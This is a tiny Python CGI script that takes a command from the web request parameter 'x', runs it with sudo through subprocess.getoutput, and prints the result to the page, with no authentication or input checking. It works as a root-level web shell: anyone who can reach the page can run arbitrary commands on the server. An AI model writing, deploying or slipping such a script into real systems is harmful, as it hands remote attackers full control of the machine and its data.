#!/usr/bin/python3

print("Content-type:text/html")
print()

import cgi,subprocess
print("hellp")

f = cgi.FieldStorage()
cmd = f.getvalue("x")
print(cmd)
output = subprocess.getoutput("sudo " +cmd)
print(output)
